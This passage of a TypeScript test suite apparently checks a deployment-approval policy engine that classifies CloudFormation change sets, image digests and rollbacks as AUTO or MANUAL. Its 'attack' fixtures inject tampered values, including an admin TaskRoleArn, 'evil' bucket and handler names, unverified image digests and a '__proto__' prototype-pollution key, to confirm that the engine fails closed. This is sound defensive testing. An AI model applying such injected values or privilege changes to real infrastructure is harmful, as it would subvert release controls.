  it("R2 SSM Value that is not the new image value", () => attack(codeInput, (i) => { rowIn(i, RT, "WorkerImageParameter7CA9ADBB").Details[2].Target.AfterValue = "something else"; }, "row-rejected", "F"));
  it("R2 SSM row with template changes (Type)", () => attack(codeInput, (i) => { stackIn(i, RT).newTemplate.Resources.WorkerImageParameter7CA9ADBB.Properties.Type = "SecureString"; }, "row-rejected", "F"));
  it("R2 SSM row for another parameter name", () => attack(codeInput, (i) => { const r = rowIn(i, RT, "WorkerImageParameter7CA9ADBB"); r.LogicalResourceId = "Other7CA9ADBB"; stackIn(i, RT).liveTemplate.Resources.Other7CA9ADBB = stackIn(i, RT).liveTemplate.Resources.WorkerImageParameter7CA9ADBB; stackIn(i, RT).newTemplate.Resources.Other7CA9ADBB = stackIn(i, RT).newTemplate.Resources.WorkerImageParameter7CA9ADBB; }, "row-rejected", "F"));
  it("R3 with a second container change", () => attack(codeInput, (i) => { rowIn(i, SL, "TaskDefinition").Details.push(detail("Properties", "ContainerDefinitions", "/Properties/ContainerDefinitions/0/Environment/0/Value", "DirectModification", "Static", { RequiresRecreation: "Always" })); stackIn(i, SL).newTemplate.Resources.TaskDefinition.Properties.ContainerDefinitions[0].Environment[0].Value = "2"; }, "row-rejected", "F"));
  it("R3 with an env var in the template only", () => attack(codeInput, (i) => { stackIn(i, SL).newTemplate.Resources.TaskDefinition.Properties.ContainerDefinitions[0].Environment.push({ Name: "EVIL", Value: "1" }); }, "row-rejected", "F"));
  it("R3 with a changed Family / TaskRoleArn", () => {
    attack(codeInput, (i) => { stackIn(i, SL).newTemplate.Resources.TaskDefinition.Properties.Family = "other"; }, "row-rejected", "F");
    attack(codeInput, (i) => { stackIn(i, SL).newTemplate.Resources.TaskDefinition.Properties.TaskRoleArn = "arn:aws:iam::111111111111:role/admin"; }, "row-rejected", "F");
  });
  it("R3 that does not replace", () => attack(codeInput, (i) => { rowIn(i, SL, "TaskDefinition").Replacement = "False"; }, "row-rejected", "F"));
  it("R3 image in another repository", () => attack(codeInput, (i) => { for (const d of rowIn(i, SL, "TaskDefinition").Details) if (d.Target.AfterValue !== undefined) d.Target.AfterValue = uri("rovara-evil", NEW.slack); }, "row-rejected", "F"));
  it("R3 image with an unverified digest", () => attack(codeInput, (i) => { for (const d of rowIn(i, SL, "TaskDefinition").Details) if (d.Target.AfterValue !== undefined) d.Target.AfterValue = uri("agentx-staging/slack", `sha256:${hex("7", 64)}`); }, "row-rejected", "F"));
  it("R3 image whose digest differs from the parameter", () => attack(codeInput, (i) => { for (const d of rowIn(i, SL, "TaskDefinition").Details) if (d.Target.AfterValue !== undefined) d.Target.AfterValue = uri("agentx-staging/slack", NEW.worker); }, "row-rejected", "F"));
  it("R3 caused by a parameter that did not change", () => attack(codeInput, (i) => { for (const d of rowIn(i, SL, "TaskDefinition").Details) if (d.CausingEntity === "OrchestratorImageUri") d.CausingEntity = "ExecutorImageUri"; }, "row-rejected", "F"));
  it("R3 with no image detail", () => attack(codeInput, (i) => { rowIn(i, SL, "TaskDefinition").Details = rowIn(i, SL, "TaskDefinition").Details.slice(0, 1); }, "row-rejected", "F"));
  it("R3 with a PolicyAction Retain", () => attack(codeInput, (i) => { rowIn(i, SL, "TaskDefinition").PolicyAction = "ReplaceAndRetain"; }, "row-rejected", "F"));
  it("R4 caused by another resource", () => attack(codeInput, (i) => { rowIn(i, SL, "Service").Details[0].CausingEntity = "Other"; }, "row-rejected", "F"));
  it("R4 with a changed DesiredCount in the template", () => attack(codeInput, (i) => { stackIn(i, SL).newTemplate.Resources.Service.Properties.DesiredCount = 50; }, "row-rejected", "F"));
  it("R4 with an extra property detail", () => attack(codeInput, (i) => { rowIn(i, SL, "Service").Details.push(detail("Properties", "DesiredCount", "/Properties/DesiredCount", "DirectModification", "Static")); }, "row-rejected", "F"));
  it("R4 with a DirectModification change source only", () => attack(codeInput, (i) => { rowIn(i, SL, "Service").Details = [detail("Properties", "TaskDefinition", "/Properties/TaskDefinition", "DirectModification", "Static")]; }, "row-rejected", "F"));
  it("R4 with no R3 row", () => attack(codeInput, (i) => { stackIn(i, SL).changeSet.Changes = changesOf(i, SL).filter((c: Record<string, any>) => c.ResourceChange.LogicalResourceId !== "TaskDefinition"); }, "row-rejected", "F"));
  it("R4 that replaces", () => attack(codeInput, (i) => { rowIn(i, SL, "Service").Replacement = "True"; }, "row-rejected", "F"));
  it("R4b with a changed schedule expression", () => attack(cloudInput, (i) => { stackIn(i, GWS).newTemplate.Resources.PriceFetchScheduleAD6AA82A.Properties.ScheduleExpression = "rate(1 minute)"; }, "row-rejected", "F"));
  it("R4b with a different target path", () => attack(cloudInput, (i) => { for (const d of rowIn(i, GWS, "PriceFetchScheduleAD6AA82A").Details) d.Target.Path = "/Properties/Targets/0/Arn"; }, "row-rejected", "F"));
  it("R4b caused by the serve task (not the price-fetch task)", () => attack(cloudInput, (i) => { for (const d of rowIn(i, GWS, "PriceFetchScheduleAD6AA82A").Details) if (d.CausingEntity !== undefined) d.CausingEntity = "ServeTaskF1990141"; }, "row-rejected", "F"));
  it("R5 with a changed SourceBucketNames", () => attack(cloudInput, (i) => { stackIn(i, WEB).newTemplate.Resources.AppFilesCustomResource512MiBE2CB5759.Properties.SourceBucketNames = ["evil"]; }, "row-rejected", "F"));
  it("R5 with a changed DestinationBucketName", () => attack(cloudInput, (i) => { stackIn(i, WEB).newTemplate.Resources.AppFilesCustomResource512MiBE2CB5759.Properties.DestinationBucketName = "evil"; }, "row-rejected", "F"));
  it("R5 with another property detail", () => attack(cloudInput, (i) => { rowIn(i, WEB, "AppFilesCustomResource512MiBE2CB5759").Details.push(detail("Properties", "DestinationBucketName", "/Properties/DestinationBucketName", "DirectModification", "Static")); }, "row-rejected", "F"));
  it("R5 that Replaces (True)", () => attack(cloudInput, (i) => { rowIn(i, WEB, "AppFilesCustomResource512MiBE2CB5759").Replacement = "True"; }, "row-rejected", "F"));
  it("R5 is only for Custom::CDKBucketDeployment: another Custom type is MANUAL", () => attack(cloudInput, (i) => { rowIn(i, WEB, "AppFilesCustomResource512MiBE2CB5759").ResourceType = "Custom::Other"; }, "row-rejected", "F"));
  it("Conditional is accepted only for R5, not for a Lambda", () => attack(cloudInput, (i) => { rowIn(i, WEB, "Server7E7D21FA").Replacement = "Conditional"; }, "row-rejected", "F"));
  it("R6 web Lambda with an extra template property", () => attack(cloudInput, (i) => { stackIn(i, WEB).newTemplate.Resources.Server7E7D21FA.Properties.Handler = "evil.handler"; }, "row-rejected", "F"));
  it("a Lambda env var change in a stack that has no image parameter", () => attack(cloudInput, (i) => { rowIn(i, WEB, "Server7E7D21FA").Details.push(detail("Properties", "Environment", "/Properties/Environment/Variables/LOG", "ParameterReference", "Static", { CausingEntity: "ImageDigest", BeforeValue: OLD.gateway, AfterValue: NEW.gateway })); }, "row-rejected", "F"));
  it("a change set that is still FAILED for another reason", () => attack(cloudInput, (i) => { stackIn(i, "rovara-cloud-staging-app").changeSet.StatusReason = "Template format error"; }, "changeset-status", "F"));
  it("a change set that is not complete", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.Status = "CREATE_IN_PROGRESS"; }, "changeset-status", "F"));
  it("a truncated / paginated change set (NextToken)", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.NextToken = "abc"; }, "changeset-truncated", "F"));
  it("a nested change set", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.IncludeNestedStacks = true; }, "nested", "F"));
  it("a parent change set id", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.ParentChangeSetId = "arn"; }, "nested", "F"));
  it("a nested stack row", () => attack(codeInput, (i) => { cpChanges(i).push(row("Nested", "AWS::CloudFormation::Stack", "Modify", "False", ["Properties"], [detail("Properties", "TemplateURL", "/Properties/TemplateURL", "DirectModification", "Static")])); }, "row-rejected", "F"));
  it("an unknown capability", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.Capabilities = ["CAPABILITY_SURPRISE"]; }, "capability", "F"));
  it("CAPABILITY_AUTO_EXPAND is accepted only while the template has no transform or macro (amendment from the real replay)", () => {
    auto((() => { const i = codeInput(); stackIn(i, CP).changeSet.Capabilities = ["CAPABILITY_IAM", "CAPABILITY_NAMED_IAM", "CAPABILITY_AUTO_EXPAND"]; return i; })());
    attack(codeInput, (i) => { stackIn(i, CP).changeSet.Capabilities = ["CAPABILITY_AUTO_EXPAND"]; stackIn(i, CP).newTemplate.Resources.BrokerE1355FD6.Properties.Handler = { "Fn::Transform": { Name: "Macro" } }; }, undefined, "E");
  });
  it("Changes missing", () => attack(codeInput, (i) => { delete stackIn(i, CP).changeSet.Changes; }, "input-missing"));
  it("Changes is not an array", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.Changes = "x"; }, "input-invalid"));
  it("a template that is not JSON", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate = "{oops"; }, "parse-error"));
  it("a template given as JSON text is accepted", () => { const i = codeInput(); for (const s of i.stacks) { s.liveTemplate = JSON.stringify(s.liveTemplate); s.newTemplate = JSON.stringify(s.newTemplate); } auto(i); });
  it("BeforeContext/AfterContext that show an extra property change", () => attack(codeInput, (i) => { const r = rowIn(i, CP, "BrokerE1355FD6"); r.BeforeContext = JSON.stringify({ Properties: { Handler: "a", Code: { S3Key: "1" } } }); r.AfterContext = JSON.stringify({ Properties: { Handler: "b", Code: { S3Key: "2" } } }); }, "row-rejected", "F"));
  it("a context that is not JSON", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").AfterContext = "{x"; }, "parse-error"));
});

describe("H: stack scope", () => {
  it("a real row in the access stack", () => attack(codeInput, (i) => { changesOf(i, "agentx-staging-access").push(lambdaRow("Fn", "1", "2")); stackIn(i, "agentx-staging-access").liveTemplate.Resources.Fn = lambdaRes("Fn", "1".repeat(64) + ".zip", true); stackIn(i, "agentx-staging-access").newTemplate.Resources.Fn = lambdaRes("Fn", "2".repeat(64) + ".zip", false); }, "row-rejected", "H"));
  it("a real row in foundation", () => attack(codeInput, (i) => { changesOf(i, "agentx-staging-foundation").push(row("T", "AWS::SSM::Parameter", "Modify", "False", ["Properties"], [detail("Properties", "Value", "/Properties/Value", "DirectModification", "Static")])); }, "row-rejected", "H"));
  it("a real row in identity", () => attack(codeInput, (i) => { changesOf(i, "agentx-staging-identity").push(row("T", "AWS::SSM::Parameter", "Modify", "False", ["Properties"], [detail("Properties", "Value", "/Properties/Value", "DirectModification", "Static")])); }, "row-rejected", "H"));
  it("any row in gateway-images", () => attack(cloudInput, (i) => { stackIn(i, "rovara-cloud-staging-gateway-images").changeSet = { Status: "CREATE_COMPLETE", Changes: [metaRow("Repo", "AWS::ECR::Repository")], Parameters: [], Capabilities: [] }; }, "row-rejected", "H"));
  it("any row in the cloud app stack", () => attack(cloudInput, (i) => { stackIn(i, "rovara-cloud-staging-app").changeSet = { Status: "CREATE_COMPLETE", Changes: [metaRow("Repo", "AWS::ECR::Repository")], Parameters: [], Capabilities: [] }; }, "row-rejected", "H"));
  it("a stack that is not in the policy", () => attack(codeInput, (i) => { i.stacks.push({ ...stackIn(i, CP), stackName: "agentx-staging-surprise" }); }, "stack-unknown"));
  it("a stack with two change sets", () => attack(codeInput, (i) => { i.stacks.push(structuredClone(stackIn(i, CP))); }, "stack-duplicate"));
  it("a missing stack", () => attack(codeInput, (i) => { i.stacks = i.stacks.filter((s: Record<string, any>) => s.stackName !== "agentx-staging-identity"); }, "stack-missing", "F"));
  it("a cloud stack missing", () => attack(cloudInput, (i) => { i.stacks = i.stacks.filter((s: Record<string, any>) => s.stackName !== "rovara-cloud-staging-app"); }, "stack-missing", "F"));
});

describe("I: images", () => {
  it("a digest whose tags lack this tree", () => attack(codeInput, (i) => { i.images[0].tags = ["tree-000000000000"]; }, "image-unverified", "I"));
  it("a digest not present in ECR", () => attack(codeInput, (i) => { i.images[0].inEcr = false; }, "image-unverified", "I"));
  it("a digest with an unknown source", () => attack(codeInput, (i) => { i.images[0].source = "pulled"; }, "image-unverified", "I"));
  it("a malformed digest", () => attack(codeInput, (i) => { i.images[0].digest = "sha256:abc"; }, "image-unverified", "I"));
  it("no verified image at all", () => attack(codeInput, (i) => { i.images = []; }, "image", "E"));
  it("an image entry with an unknown field", () => attack(codeInput, (i) => { i.images[0].extra = 1; }, "unknown-field"));
  it("the reused-by-tree-tag source is fine (slack fixture)", () => { expect(codeInput().images[1].source).toBe("reused"); auto(codeInput()); });
  it("an unused extra verified image is harmless", () => { const i = codeInput(); i.images.push(imageEntry("rovara-other", `sha256:${hex("8", 64)}`)); auto(i); });
  it("a verified digest for the wrong repository does not verify another repo", () => attack(codeInput, (i) => { i.images[0] = imageEntry("agentx-staging/slack-executor", NEW.worker); }, "image", "E"));
});

describe("P-RB: rollback", () => {
  const rollbackInput = (): Record<string, any> => {
    const i = codeInput();
    i.trigger = { kind: "rollback", variables: {}, rollback: { lastGoodSha: SHA, floorAncestry: {}, targetIsAncestorOfInstalled: true, priorAutoRollbacksThisHold: 0 } };
    i.holdParameters = ["/rovara-release/staging/code-hold/rollback"];
    return i;
  };
  const floorSha = hex("f");
  const withFloor = (i: Record<string, any>, answer: boolean): void => {
    i.policyFiles["rollback-floor.txt"] = `${POLICY_TEXT["rollback-floor.txt"]}\ncode ${floorSha}  # MODEL-QUOTA-AWARE\ncloud ${hex("e")}\n`;
    repin(i);
    i.trigger.rollback.floorAncestry = { [floorSha]: answer };
  };
  it("a routine rollback with a HOLD set is AUTO", () => { const i = rollbackInput(); auto(i); });
  it("a rollback at or above the floor is AUTO (cloud floors do not apply to code)", () => { const i = rollbackInput(); withFloor(i, true); auto(i); });
  it("a rollback below the floor", () => { const i = rollbackInput(); withFloor(i, false); manual(i, "below-floor", "P-RB"); });
  it("a floor with no ancestry answer", () => { const i = rollbackInput(); withFloor(i, true); i.trigger.rollback.floorAncestry = {}; manual(i, "floor-unknown", "P-RB"); });
  it("a rollback with no HOLD", () => { const i = rollbackInput(); i.holdParameters = []; manual(i, "no-hold", "P-RB"); });
  it("a second automatic rollback in the same HOLD", () => { const i = rollbackInput(); i.trigger.rollback.priorAutoRollbacksThisHold = 1; manual(i, "second-rollback", "P-RB"); });
  it("a rollback that is not last-good", () => { const i = rollbackInput(); i.trigger.rollback.lastGoodSha = hex("9"); manual(i, "not-last-good", "P-RB"); });
  it("a rollback target that is not older than the installed sha", () => { const i = rollbackInput(); i.trigger.rollback.targetIsAncestorOfInstalled = false; manual(i, "not-backwards", "P-RB"); });
  it("a rollback to the installed sha itself", () => { const i = rollbackInput(); i.previousInstalledSha = i.sha; manual(i, "not-backwards", "P-RB"); });
  it("a rollback whose rows are not routine in reverse (an Add / a Remove)", () => { const i = rollbackInput(); changesOf(i, CP).push(row("Gone", "AWS::DynamoDB::Table", "Remove", null, [], [])); manual(i, "row-rejected", "G"); });
  it("a rollback never deploys the access stack", () => { const i = rollbackInput(); changesOf(i, "agentx-staging-access").push(row("X", "AWS::SSM::Parameter", "Modify", "False", ["Properties"], [detail("Properties", "Value", "/Properties/Value", "DirectModification", "Static")])); manual(i, "rollback-access", "P-RB"); });
  it("rollback data on a push run", () => attack(codeInput, (i) => { i.trigger.rollback = { lastGoodSha: SHA, floorAncestry: {}, targetIsAncestorOfInstalled: true, priorAutoRollbacksThisHold: 0 }; }, "trigger-kind", "A"));
  it("a rollback with an unknown field", () => { const i = rollbackInput(); i.trigger.rollback.extra = 1; manual(i, "unknown-field"); });
  it("a malformed floor line fails closed", () => { const i = rollbackInput(); i.policyFiles["rollback-floor.txt"] = "code nothex\n"; repin(i); manual(i, "policy-invalid"); });
  it("a push run with variables is not a rollback", () => { const i = rollbackInput(); i.trigger.variables = { X: "1" }; manual(i, "variables-set", "A"); });
});

describe("fail closed", () => {
  it("never throws and is MANUAL on garbage", () => {
    for (const bad of [null, undefined, 5, "x", [], {}, { pipeline: "code" }, { pipeline: "prod" }]) {
      const d = evaluate(bad);
      expect(d.verdict).toBe("MANUAL");
      expect(d.reasons.length).toBeGreaterThan(0);
    }
  });
  it("circular input is MANUAL", () => { const a: Record<string, unknown> = {}; a.self = a; expect(evaluate(a).verdict).toBe("MANUAL"); });
  it("an unknown top-level field", () => attack(codeInput, (i) => { i.surprise = 1; }, "unknown-field"));
  it("each required top-level field missing", () => {
    for (const key of ["sha", "previousInstalledSha", "tree", "now", "environment", "checkMode", "holdParameters", "unauditedAutoRuns", "trigger", "policyFiles", "policyManifest", "policyPin", "changedPaths", "releaseNotes", "stacks", "images", "gates", "ci", "answers", "overrides"]) {
      attack(codeInput, (i) => { delete i[key]; });
    }
    attack(codeInput, (i) => { delete i.ancestry; });
  });
  it("a bad account id", () => attack(codeInput, (i) => { i.environment.accountId = "123"; }, "input-invalid"));
  it("a bad now", () => attack(codeInput, (i) => { i.now = "yesterday"; }, "input-invalid"));
  it("a __proto__ key in a change set does not reach inherited values", () => {
    const i = codeInput();
    const text = JSON.stringify(i).replace('"Status":"CREATE_COMPLETE"', '"Status":"CREATE_COMPLETE","__proto__":{"NextToken":"x"}');
    const d = evaluate(JSON.parse(text));
    expect(d.verdict === "AUTO" || d.verdict === "MANUAL").toBe(true);
  });
  it("the decision carries the policy hash, the input hash and every row's rule", () => {
    const d = auto(codeInput());
    expect(d.policyHash).toMatch(/^[0-9a-f]{64}$/);
    expect(d.inputHash).toMatch(/^[0-9a-f]{64}$/);
    expect(d.rows.every((r) => r.rule !== null)).toBe(true);
    expect(d.rows.length).toBeGreaterThan(10);
  });
  it("is deterministic", () => { expect(evaluate(codeInput())).toEqual(evaluate(codeInput())); });
  it("all reasons are reported, not only the first", () => { const i = codeInput(); i.checkMode = "manual"; i.holdParameters = ["h"]; i.gates = []; i.changedPaths.push("package.json"); const d = evaluate(i); expect(new Set(d.reasons.map((r) => r.rule)).size).toBeGreaterThanOrEqual(3); });
});

void [KNOWN, OLD, NOW, TREE, manifestFor, ciRunFix, stackIn, rowIn, metaRow, SL];

describe("conditional resources (real replay: no row for a resource whose Condition is false)", () => {
  const setup = (i: Record<string, any>, liveCond: unknown, newCond: unknown, paramValue = "off"): void => {
    const s = stackIn(i, CP);
    for (const t of [s.liveTemplate, s.newTemplate]) { t.Parameters.Switch = { Type: "String" }; t.Conditions = { ...t.Conditions, IsOn: t === s.liveTemplate ? liveCond : newCond }; }
    s.liveParameters.push(param("Switch", paramValue));
    s.changeSet.Parameters.push(param("Switch", paramValue));
    s.liveTemplate.Resources.Optional = { Type: "AWS::Lambda::Function", Condition: "IsOn", Properties: { Code: { S3Key: "a" } } };
    s.newTemplate.Resources.Optional = { Type: "AWS::Lambda::Function", Condition: "IsOn", Properties: { Code: { S3Key: "b" } } };
  };
  const eq = (v: string): unknown => ({ "Fn::Equals": [{ Ref: "Switch" }, v] });
  it("a false Condition on both sides: the unlisted difference is fine", () => { const i = codeInput(); setup(i, eq("on"), eq("on")); auto(i); });
  it("a false Condition built with Fn::Not / Fn::And / Fn::Or / a Condition reference", () => {
    const i = codeInput();
    setup(i, { "Fn::And": [{ "Fn::Not": [{ "Fn::Equals": [{ Ref: "Switch" }, "off"] }] }, { "Condition": "UseX" }] }, { "Fn::And": [{ "Fn::Not": [{ "Fn::Equals": [{ Ref: "Switch" }, "off"] }] }, { "Condition": "UseX" }] });
    auto(i);
  });
  it("a true Condition: the unlisted difference is MANUAL", () => attack(codeInput, (i) => { setup(i, eq("off"), eq("off")); }, "template-no-row", "G"));
  it("an unknown Condition (Fn::Join) is MANUAL", () => attack(codeInput, (i) => { setup(i, { "Fn::Equals": [{ "Fn::Join": ["", ["o", "n"]] }, "on"] }, { "Fn::Equals": [{ "Fn::Join": ["", ["o", "n"]] }, "on"] }); }, "template-no-row", "G"));
  it("a Condition that is false live but true in the new template is MANUAL", () => attack(codeInput, (i) => { setup(i, eq("on"), eq("off")); }, "template-no-row", "G"));
  it("a Condition name that does not exist is MANUAL", () => attack(codeInput, (i) => { setup(i, eq("on"), eq("on")); stackIn(i, CP).newTemplate.Resources.Optional.Condition = "Missing"; stackIn(i, CP).liveTemplate.Resources.Optional.Condition = "Missing"; }, "template-no-row", "G"));
  it("a Condition that is not a string is MANUAL", () => attack(codeInput, (i) => { setup(i, eq("on"), eq("on")); stackIn(i, CP).newTemplate.Resources.Optional.Condition = { x: 1 }; }, "template-no-row", "G"));
  it("a resource that has no Condition is never exempt", () => attack(codeInput, (i) => { setup(i, eq("on"), eq("on")); delete stackIn(i, CP).newTemplate.Resources.Optional.Condition; delete stackIn(i, CP).liveTemplate.Resources.Optional.Condition; }, "template-no-row", "G"));
});
